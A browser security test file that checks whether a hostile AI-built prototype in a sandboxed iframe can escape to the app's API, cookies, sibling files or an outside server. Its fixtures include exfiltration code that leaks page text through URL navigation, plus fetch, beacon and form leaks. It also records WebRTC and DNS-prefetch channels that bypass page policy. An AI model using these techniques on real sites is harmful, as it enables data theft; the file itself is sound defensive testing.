// Escape tests in a real browser (ORC-029 pass 3, 3b; spec section 6, Safety): a hostile prototype, served by the
// prototype server and framed by an app page with sandbox="allow-scripts", tries to reach the app's API, the
// network and a sibling artifact, to use cookies and storage, to submit a form, to navigate the app's window and to
// pass the app messages that are not pins. Every attempt must fail. The checks look at the effects (what the app's
// server, an outside server, the prototype server and the browser received), not only at the prototype's own
// record. A control runs the same prototype without the guards and shows each of those effects does appear, so
// the checks can see an escape.
//
// The browser is the system Chrome through playwright-core (CHROME_PATH or the installed Google Chrome). Without
// it these tests are skipped, with the reason printed.

import { randomBytes } from "node:crypto";
import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer, type IncomingMessage, type OutgoingHttpHeaders, type Server, type ServerResponse } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { chromium, type Browser, type BrowserContext, type Frame, type Page } from "playwright-core";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { acceptPinMessage, prototypeOrigin } from "../../src/runtime/prototype";
import { appPagePolicy, createHttpServer } from "../http";
import { FakeAdapter, defaultFakeConfig } from "../runtimes/fake";
import { Scheduler } from "../scheduler";
import { Store } from "../store";
import { createPrototypeServer } from "./serve";
import { deadProxy, launchChrome, noNetworkArgs } from "./shots";
import { TINY_PNG, close, lanAddress, listen, netLogHosts, outsideHosts, outsideListeners, outsidePage, writeVersion } from "./testFixtures";

const chrome = await launchChrome();
const browser: Browser | undefined = "browser" in chrome ? chrome.browser : undefined;
// Written straight to stderr: the test runner shows no console output from a skipped file.
if (!browser) process.stderr.write(`Skipping the prototype escape tests in a real browser: ${"missing" in chrome ? chrome.missing : ""}. Install Google Chrome or set CHROME_PATH.\n`);

const FIXTURES = join(import.meta.dirname, "fixtures");
const HOSTILE = { "a/index.html": readFileSync(join(FIXTURES, "hostile", "index.html")), "a/hostile.js": readFileSync(join(FIXTURES, "hostile", "hostile.js")), "a/style.css": readFileSync(join(FIXTURES, "hostile", "style.css")) };
const SIBLING = { "a/index.html": "<p>The sibling</p>", "a/secret.txt": "sibling secret", "a/secret.js": readFileSync(join(FIXTURES, "sibling", "secret.js")), "a/secret.png": TINY_PNG };
/** A prototype that navigates its own frame to the outside server, with its text in the URL: no policy of its own can stop that. */
const NAVIGATOR = {
  "a/index.html": "<p>Navigating</p><script src=\"nav.js\"></script>",
  "a/nav.js": "setTimeout(function () { location.href = new URLSearchParams(location.search).get('ext') + '/self?leak=' + encodeURIComponent(document.body.innerText); }, 200);",
};
/**
 * A prototype written the way agents write them, all inline: a <style> block, a style attribute, an inline script
 * and an inline event handler (the policy allows them, design 3b as built). Its inline script also tries the network.
 */
const INLINE = {
  "a/index.html": `<!doctype html><html><head><meta charset="utf-8"><style>main { color: rgb(4, 5, 6); }</style></head>
<body><main><p id="styled" style="color: rgb(7, 8, 9)">Styled inline</p><button id="go" type="button" onclick="window.__clicked = true">Go</button></main>
<form id="leak" method="post" target="sink"><input name="secret" value="from-inline"></form><iframe name="sink" hidden></iframe>
<script>
(async function () {
  var q = new URLSearchParams(location.search);
  var attempts = (window.__attempts = {});
  window.__inlineRan = true;
  function outcome(name, p) { return p.then(function (v) { attempts[name] = "succeeded: " + v; }, function (e) { attempts[name] = "blocked: " + e.name; }); }
  function loads(name, tag, url) {
    return new Promise(function (resolve) {
      var el = document.createElement(tag);
      el.onload = function () { attempts[name] = "loaded"; resolve(); };
      el.onerror = function () { attempts[name] = "blocked: error"; resolve(); };
      setTimeout(function () { if (!(name in attempts)) attempts[name] = "no answer"; resolve(); }, 1500);
      if (tag === "link") { el.rel = "stylesheet"; el.href = url; } else el.src = url;
      document.head.appendChild(el);
    });
  }
  await Promise.all([
    outcome("fetchAppApi", fetch(q.get("app") + "/api/state").then(function (r) { return r.status; })),
    outcome("fetchExternal", fetch(q.get("ext") + "/inline-fetch").then(function (r) { return r.status; })),
    loads("imageExternal", "img", q.get("ext") + "/inline-image"),
    loads("scriptExternal", "script", q.get("ext") + "/inline-script"),
    loads("styleExternal", "link", q.get("ext") + "/inline-style"),
  ]);
  try { attempts.beacon = String(navigator.sendBeacon(q.get("ext") + "/inline-beacon", "from-inline")); } catch (e) { attempts.beacon = "blocked: " + e.name; }
  try { var f = document.getElementById("leak"); f.action = q.get("ext") + "/inline-form"; f.submit(); } catch (e) {}
  document.getElementById("go").click();
  await new Promise(function (resolve) { setTimeout(resolve, 500); });
  window.__done = true;
})();
</script></body></html>`,
};
const COOKIE = { name: "session", value: "app-secret" };

let root: string;
let store: Store;
let app: Server, control: Server, prototypes: Server, outside: Server;
let appPort: number, controlPort: number, protoPort: number, extPort: number;
/** What each server received: path (and Host for the prototype server, with the status it answered). */
const appRequests: string[] = [];
const outsideRequests: string[] = [];
const protoRequests: { host: string; url: string; status: number }[] = [];

/**
 * An app page (served by the app's own server) that frames `src` like the studio will, and takes pins through
 * acceptPinMessage. Its script is a file (APP_PAGE_SCRIPT), as the app's are: the app's policy runs no inline script.
 * A second frame, a srcdoc as the studio's diagram frame is, forges a pin.
 */
function appPage(src: string, sandbox: boolean): string {
  const attr = sandbox ? ' sandbox="allow-scripts"' : "";
  return `<!doctype html><html><head><meta charset="utf-8"><title>App page</title><script src="/app-page.js"></script></head><body>
<iframe id="prototype"${attr} src="${src}" style="width: 900px; height: 600px"></iframe>
<iframe id="forger" sandbox="allow-scripts" srcdoc="<script src='/forger.js'></script>"></iframe>
</body></html>`;
}
const APP_PAGE_SCRIPT = `const acceptPinMessage = ${acceptPinMessage.toString()};
window.__messages = [];
window.__pins = [];
addEventListener("message", (e) => {
  const frame = document.getElementById("prototype").contentWindow;
  const pin = acceptPinMessage(e, frame);
  window.__messages.push({ fromPrototype: e.source === frame, accepted: pin !== null, data: e.data });
  if (pin) window.__pins.push(pin);
});
`;
const FORGER_SCRIPT = "parent.postMessage({ type: 'orchestrator-pin', x: 0.5, y: 0.5, selector: 'forged' }, '*');";
/** What the app's server serves for an app page besides the page: its script, and the forger's. */
const PAGE_FILES = ["/app-page.js", "/forger.js"];

beforeAll(async () => {
  if (!browser) return;
  root = mkdtempSync(join(tmpdir(), "orch-escape-"));
  const studio = join(root, "studio", "p-test");
  writeVersion(studio, "sa-1", 1, HOSTILE);
  writeVersion(studio, "sa-2", 1, SIBLING);
  writeVersion(studio, "sa-3", 1, NAVIGATOR);
  writeVersion(studio, "sa-4", 1, INLINE);

  // The app: the real service's HTTP server, serving a stand-in for the studio page from its static folder. The
  // controls use a second one whose pages go out without the app's policy (as a page with no guard would).
  const staticDir = join(root, "static");
  // The ports first: the allowed Host and the prototypes' frame-ancestors name them.
  const free = async () => {
    const probe = createServer();
    const p = await listen(probe);
    await close(probe);
    return p;
  };
  appPort = await free();
  controlPort = await free();
  store = new Store(join(root, "test.db"));
  const config = defaultFakeConfig();
  const scheduler = new Scheduler(store, { claude: new FakeAdapter("claude", config), codex: new FakeAdapter("codex", config) });
  outside = createServer((req, res) => {
    outsideRequests.push(`${req.method} ${req.url}`);
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(req.url === "/framer" ? `<iframe sandbox="allow-scripts" src="${prototypeOrigin("sa-1", 1, protoPort)}/a/index.html"></iframe>` : "outside");
  });
  outside.on("upgrade", (req, socket) => {
    outsideRequests.push(`UPGRADE ${req.url}`);
    socket.destroy();
  });
  extPort = await listen(outside);
  prototypes = createPrototypeServer({ studioDir: () => studio, appOrigins: [`http://127.0.0.1:${appPort}`, `http://localhost:${appPort}`, `http://127.0.0.1:${controlPort}`] });
  prototypes.on("request", (req, res) => res.on("finish", () => protoRequests.push({ host: req.headers.host ?? "", url: req.url ?? "", status: res.statusCode })));
  protoPort = await listen(prototypes);

  const query = (appOrigin: string) => `?app=${encodeURIComponent(appOrigin)}&ext=${encodeURIComponent(`http://127.0.0.1:${extPort}`)}&sibling=${encodeURIComponent(prototypeOrigin("sa-2", 1, protoPort))}`;
  const guarded = query(`http://127.0.0.1:${appPort}`);
  cpSync(join(FIXTURES, "hostile"), join(staticDir, "unguarded"), { recursive: true });
  writeFileSync(join(staticDir, "app-page.js"), APP_PAGE_SCRIPT);
  writeFileSync(join(staticDir, "forger.js"), FORGER_SCRIPT);
  writeFileSync(join(staticDir, "index.html"), appPage(`${prototypeOrigin("sa-1", 1, protoPort)}/a/index.html${guarded}`, true));
  writeFileSync(join(staticDir, "control.html"), appPage(`/unguarded/index.html${query(`http://127.0.0.1:${controlPort}`)}`, false));
  writeFileSync(join(staticDir, "navigate.html"), appPage(`${prototypeOrigin("sa-3", 1, protoPort)}/a/index.html${guarded}`, true));
  writeFileSync(join(staticDir, "inline.html"), appPage(`${prototypeOrigin("sa-4", 1, protoPort)}/a/index.html${guarded}`, true));
  const startedAt = new Date().toISOString();
  app = createHttpServer({ store, scheduler, startedAt, allowedHosts: [`127.0.0.1:${appPort}`], staticDir, prototypePort: protoPort });
  const unguarded = createHttpServer({ store, scheduler, startedAt, allowedHosts: [`127.0.0.1:${controlPort}`], staticDir });
  const handle = unguarded.listeners("request")[0] as (req: IncomingMessage, res: ServerResponse) => void;
  control = createServer((req, res) => {
    const writeHead = res.writeHead.bind(res) as (status: number, headers?: OutgoingHttpHeaders) => ServerResponse;
    res.writeHead = ((status: number, headers?: OutgoingHttpHeaders) => writeHead(status, Object.fromEntries(Object.entries(headers ?? {}).filter(([k]) => k.toLowerCase() !== "content-security-policy")))) as ServerResponse["writeHead"];
    handle(req, res);
  });
  for (const [s, p] of [[app, appPort], [control, controlPort]] as const) {
    s.on("request", (req) => appRequests.push(req.url ?? ""));
    await new Promise<void>((r) => s.listen(p, "127.0.0.1", r));
  }
}, 30_000);

afterAll(async () => {
  await browser?.close();
  for (const s of [app, control, prototypes, outside]) await close(s);
  store?.close();
  if (root) rmSync(root, { recursive: true, force: true });
});

/** A browser context with the app's cookie, where every request is recorded and none reaches the internet. */
async function newContext(): Promise<{ context: BrowserContext; page: Page; seen: string[] }> {
  const context = await browser!.newContext();
  await context.addCookies([{ ...COOKIE, domain: "127.0.0.1", path: "/" }]);
  const seen: string[] = [];
  await context.route("**/*", (route) => {
    const url = route.request().url();
    seen.push(url);
    return url.startsWith("http://127.0.0.1:") || url.includes(".localhost:") ? route.continue() : route.fulfill({ status: 200, body: "the internet" });
  });
  return { context, page: await context.newPage(), seen };
}

async function prototypeFrame(page: Page, prefix: string): Promise<Frame> {
  let frame: Frame | undefined;
  await expect.poll(() => (frame = page.frames().find((f) => f.url().startsWith(prefix))), { timeout: 10_000 }).toBeTruthy();
  // A function, not source: waiting on source evaluates a string in the page, which the prototype's policy refuses.
  await frame!.waitForFunction(() => (globalThis as { __done?: boolean }).__done === true, undefined, { timeout: 15_000 });
  return frame!;
}

/** Evaluates `expr` (JavaScript source) in a page or a frame. Source, not a function: the server's TypeScript has no DOM types. */
const js = <T>(target: Page | Frame, expr: string) => target.evaluate(expr) as Promise<T>;
const attemptsIn = (frame: Frame) => js<Record<string, string | boolean>>(frame, "window.__attempts");

describe.skipIf(!browser)("a hostile prototype in the app's sandboxed frame", () => {
  it("cannot reach the app's API, the network or a sibling artifact, use cookies, submit a form, navigate the app or pass a non-pin message", async () => {
    const { context, page, seen } = await newContext();
    const start = { app: appRequests.length, outside: outsideRequests.length, proto: protoRequests.length };
    const appUrl = `http://127.0.0.1:${appPort}/`;
    await page.goto(appUrl);
    const origin = prototypeOrigin("sa-1", 1, protoPort);
    const frame = await prototypeFrame(page, origin);

    // It ran: its own script, its own stylesheet and the pin script loaded from its own origin.
    const attempts = await attemptsIn(frame);
    expect(Object.keys(attempts).length).toBeGreaterThanOrEqual(20);
    expect(await js(frame, 'getComputedStyle(document.querySelector("main")).color')).toBe("rgb(1, 2, 3)");

    // Cookies and storage, observed directly in the frame: its origin is opaque.
    expect(await js(frame, "(() => { try { return document.cookie; } catch (e) { return e.name; } })()")).toBe("SecurityError");
    expect([attempts.readCookie, attempts.setCookie, attempts.localStorage]).toEqual(["blocked: SecurityError", "blocked: SecurityError", "blocked: SecurityError"]);
    // The sibling's script never ran here.
    expect(await js(frame, "window.__siblingRan ?? false")).toBe(false);

    // The owner's click is the one message the app accepts.
    await frame.click("main > button:nth-of-type(2)");
    const where = await js<{ x: number; y: number }>(
      frame,
      `(() => {
        const r = document.querySelector("main > button:nth-of-type(2)").getBoundingClientRect();
        const d = document.documentElement;
        return { x: (r.left + r.width / 2 + scrollX) / d.scrollWidth, y: (r.top + r.height / 2 + scrollY) / d.scrollHeight };
      })()`,
    );
    await expect.poll(() => js(page, "window.__pins.length")).toBe(1);
    const [pin] = await js<{ type: string; x: number; y: number; selector: string }[]>(page, "window.__pins");
    expect(pin.type).toBe("orchestrator-pin");
    expect(pin.selector).toBe("html > body > main > button:nth-of-type(2)");
    expect(pin.x).toBeCloseTo(where.x, 2);
    expect(pin.y).toBeCloseTo(where.y, 2);

    // Its messages that are not pins arrived and were refused; so was a well-formed pin from another frame.
    const messages = await js<{ fromPrototype: boolean; accepted: boolean; data: unknown }[]>(page, "window.__messages");
    const fromPrototype = messages.filter((m) => m.fromPrototype);
    expect(fromPrototype.filter((m) => !m.accepted)).toHaveLength(12); // six kinds, each to parent and to top
    expect(fromPrototype.filter((m) => m.accepted).map((m) => m.data)).toEqual([pin]);
    expect(messages.filter((m) => !m.fromPrototype)).toEqual([{ fromPrototype: false, accepted: false, data: { type: "orchestrator-pin", x: 0.5, y: 0.5, selector: "forged" } }]);

    // Navigating the app's window, attempted last, failed.
    await frame.waitForFunction(() => "navigateTop" in (globalThis as unknown as { __attempts: object }).__attempts, undefined, { timeout: 5_000 });
    await page.waitForTimeout(500);
    expect(page.url()).toBe(appUrl);
    expect((await attemptsIn(frame)).openWindow).toBe("succeeded: null");

    // What reached anything: the app's server served its page only; the outside server and the internet got nothing;
    // the prototype server got nothing for the sibling, and the path tricks on its own origin found nothing.
    expect(appRequests.slice(start.app).sort()).toEqual(["/", ...PAGE_FILES]);
    expect(outsideRequests.slice(start.outside)).toEqual([]);
    expect(seen.filter((u) => !u.startsWith(appUrl) && !u.startsWith(`${origin}/`))).toEqual([]);
    const proto = protoRequests.slice(start.proto).map((r) => `${r.host} ${r.url.split("?")[0]} ${r.status}`);
    const own = `p-sa-1-v1.localhost:${protoPort}`;
    // (Both path tricks normalise to the same URL, which Chrome may fetch once.)
    expect([...new Set(proto)].sort()).toEqual([`${own} /__orchestrator/pin.js 200`, `${own} /a/hostile.js 200`, `${own} /a/index.html 200`, `${own} /a/style.css 200`, `${own} /sa-2/v1/a/secret.js 404`]);
    expect(await context.cookies()).toEqual([expect.objectContaining(COOKIE)]);
    await context.close();
  }, 60_000);

  it("cannot navigate its own frame away: the app page's frame-src stops it (and without it, it would)", async () => {
    const navigated: string[][] = [];
    for (const guarded of [true, false]) {
      const { context, page } = await newContext();
      const start = { outside: outsideRequests.length, proto: protoRequests.length };
      const response = await page.goto(`http://127.0.0.1:${guarded ? appPort : controlPort}/navigate.html`);
      expect(response?.headers()["content-security-policy"]).toBe(guarded ? appPagePolicy(protoPort) : undefined);
      // The prototype loaded and its script ran, in both.
      await expect.poll(() => protoRequests.slice(start.proto).some((r) => r.host === `p-sa-3-v1.localhost:${protoPort}` && r.url === "/a/nav.js" && r.status === 200), { timeout: 5_000 }).toBe(true);
      await page.waitForTimeout(1000);
      navigated.push(outsideRequests.slice(start.outside));
      await context.close();
    }
    expect(navigated).toEqual([[], ["GET /self?leak=Navigating"]]);
  }, 30_000);

  it("inline styles, scripts and handlers work, and an inline script still reaches no network", async () => {
    const { context, page, seen } = await newContext();
    const start = { app: appRequests.length, outside: outsideRequests.length, proto: protoRequests.length };
    const appUrl = `http://127.0.0.1:${appPort}/inline.html`;
    await page.goto(appUrl);
    const origin = prototypeOrigin("sa-4", 1, protoPort);
    const frame = await prototypeFrame(page, origin);
    // The <style> block, the style attribute, the inline script and the onclick handler all ran.
    expect(await js(frame, 'getComputedStyle(document.querySelector("main")).color')).toBe("rgb(4, 5, 6)");
    expect(await js(frame, 'getComputedStyle(document.getElementById("styled")).color')).toBe("rgb(7, 8, 9)");
    expect(await js(frame, "[window.__inlineRan === true, window.__clicked === true]")).toEqual([true, true]);
    // Its requests failed in the page, and the effects show none of them left it.
    const attempts = await attemptsIn(frame);
    expect(attempts).toMatchObject({ fetchAppApi: "blocked: TypeError", fetchExternal: "blocked: TypeError", imageExternal: "blocked: error", scriptExternal: "blocked: error", styleExternal: "blocked: error" });
    await page.waitForTimeout(500);
    expect(appRequests.slice(start.app).sort()).toEqual([...PAGE_FILES, "/inline.html"]);
    expect(outsideRequests.slice(start.outside)).toEqual([]);
    expect(seen.filter((u) => u !== appUrl && !PAGE_FILES.some((f) => u === `http://127.0.0.1:${appPort}${f}`) && !u.startsWith(`${origin}/`))).toEqual([]);
    expect([...new Set(protoRequests.slice(start.proto).map((r) => `${r.url.split("?")[0]} ${r.status}`))].sort()).toEqual(["/__orchestrator/pin.js 200", "/a/index.html 200"]);
    await context.close();
  }, 30_000);

  it("is not shown at all when a page other than the app frames it", async () => {
    const { context, page } = await newContext();
    const start = protoRequests.length;
    await page.goto(`http://127.0.0.1:${extPort}/framer`);
    await page.waitForTimeout(1500);
    // The prototype server answered; the browser did not show the page in that frame.
    expect(protoRequests.slice(start).map((r) => `${r.url} ${r.status}`)).toEqual(["/a/index.html 200"]);
    const frame = page.frames()[1];
    expect(frame.url()).not.toContain(".localhost:");
    expect(await js(frame, "window.__attempts ?? null").catch(() => null)).toBeNull();
    await context.close();
  }, 30_000);

  it("control: the same prototype without the guards does reach each of them, so the checks above can see an escape", async () => {
    const { context, page, seen } = await newContext();
    const start = { app: appRequests.length, outside: outsideRequests.length, proto: protoRequests.length };
    // The control's app page has no frame policy, and frames the prototype from its own origin without a sandbox.
    await page.goto(`http://127.0.0.1:${controlPort}/control.html`);
    const frame = await prototypeFrame(page, `http://127.0.0.1:${controlPort}/unguarded/`);
    const attempts = await attemptsIn(frame);
    expect(attempts.readCookie).toBe(`succeeded: ${JSON.stringify(`${COOKIE.name}=${COOKIE.value}`)}`);
    expect(attempts.fetchAppApi).toBe("succeeded: status 200 basic");
    expect(await js(frame, "window.__siblingRan ?? false")).toBe(true);
    await page.waitForURL(`http://127.0.0.1:${extPort}/top`, { timeout: 5_000 });
    expect(appRequests.slice(start.app)).toContain("/api/state");
    expect(outsideRequests.slice(start.outside)).toEqual(expect.arrayContaining(["GET /fetch", "GET /image", "POST /form", "POST /beacon", "GET /top"]));
    expect(seen).toContain("https://example.com/orchestrator-escape");
    expect(protoRequests.slice(start.proto).map((r) => `${r.host} ${r.url} ${r.status}`)).toEqual(expect.arrayContaining([`p-sa-2-v1.localhost:${protoPort} /a/secret.js 200`]));
    await context.close();
  }, 60_000);
});

// Ways out that no page policy covers (pass 3 review, finding 3): WebRTC (STUN over UDP, TURN over TCP), and the
// browser's own DNS prefetch and preconnect. connect-src does not apply to them, and neither does the frame's sandbox.
// Listeners on this machine's network address stand in for servers on the internet, and Chrome's own network log
// shows which host names it looked up. Each run uses a Chrome profile of its own, as a person's Chrome has one (an
// incognito context never prefetches).
const LAN = lanAddress();
describe.skipIf(!browser || !LAN)("a prototype's WebRTC, DNS prefetch and preconnect", () => {
  /** The outside page in a fresh profile: framed by the app page as the studio frames it, or top-level as the screenshots load it. */
  async function visit(how: "owner's frame" | "screenshot flags"): Promise<{ hits: string[]; looked: Record<string, string[]>; ice: string[]; tag: string }> {
    const listeners = await outsideListeners();
    const tag = randomBytes(4).toString("hex");
    const id = how === "owner's frame" ? "sa-5" : "sa-6";
    writeVersion(join(root, "studio", "p-test"), id, 1, { "a/index.html": outsidePage(LAN!, listeners, tag) });
    writeFileSync(join(root, "static", "outside.html"), appPage(`${prototypeOrigin(id, 1, protoPort)}/a/index.html`, true));
    const dir = mkdtempSync(join(root, "profile-"));
    const netLog = join(dir, "netlog.json");
    const proxy = how === "screenshot flags" ? await deadProxy() : undefined;
    const path = process.env.CHROME_PATH;
    let ice: string[] = [];
    const context = await chromium.launchPersistentContext(join(dir, "profile"), {
      headless: true,
      ...(path ? { executablePath: path } : { channel: "chrome" }),
      args: [`--log-net-log=${netLog}`, "--net-log-capture-mode=Everything", ...(proxy ? noNetworkArgs(proxy.port) : [])],
    });
    try {
      const page = context.pages()[0] ?? (await context.newPage());
      const origin = prototypeOrigin(id, 1, protoPort);
      if (how === "owner's frame") await page.goto(`http://127.0.0.1:${appPort}/outside.html`);
      else await page.goto(`${origin}/a/index.html`);
      const frame = how === "owner's frame" ? await prototypeFrame(page, origin) : page.mainFrame();
      if (how === "screenshot flags") await frame.waitForFunction(() => (globalThis as { __done?: boolean }).__done === true, undefined, { timeout: 15_000 });
      await page.waitForTimeout(1500);
      ice = await js<string[]>(frame, "window.__ice");
    } finally {
      await context.close();
      await listeners.close();
      proxy?.close();
    }
    return { hits: listeners.hits(), looked: netLogHosts(netLog, tag), ice, tag };
  }
  const queried = (events: string[] | undefined) => (events ?? []).some((e) => /DNS_TRANSACTION|HOST_RESOLVER_SYSTEM_TASK|HOST_RESOLVER_DNS_TASK/.test(e));

  it("in the owner's own Chrome, from the studio's sandboxed frame, still reach the network: the app cannot stop them (the design says so)", async () => {
    const { hits, looked, ice, tag } = await visit("owner's frame");
    expect(ice.filter((c) => / typ host /.test(c)).length).toBeGreaterThan(0);
    // What the owner's browser allows today (Chrome 154, 2026-10-02). If this starts to fail, Chrome closed a way
    // out: update "F2 as built" in docs/design/ORC-029-pass4-design.md.
    expect(hits).toEqual(expect.arrayContaining(["STUN: 20 bytes over UDP", "TURN: a TCP connection", "preconnect: a TCP connection"]));
    const h = outsideHosts(tag);
    expect({ dnsPrefetch: queried(looked[h.dnsPrefetch]), scripted: queried(looked[h.scripted]), preconnect: queried(looked[h.preconnect]), stun: queried(looked[h.stun]) }).toEqual({ dnsPrefetch: true, scripted: true, preconnect: true, stun: true });
  }, 60_000);

  it("in a Chrome with the screenshot browser's flags, reach nothing: no packet, no connection, no name looked up", async () => {
    const { hits, looked, ice, tag } = await visit("screenshot flags");
    expect(hits).toEqual([]);
    expect(Object.entries(looked).filter(([, events]) => queried(events))).toEqual([]);
    // They were tried: WebRTC gathered and found no way out (not one candidate), and the preconnect to a name went to
    // the proxy, which is dead, without a lookup.
    expect(ice).toEqual(["end"]);
    expect(looked[outsideHosts(tag).preconnect]).toEqual(expect.arrayContaining(["HTTP_STREAM_JOB_CONTROLLER"]));
  }, 60_000);
});
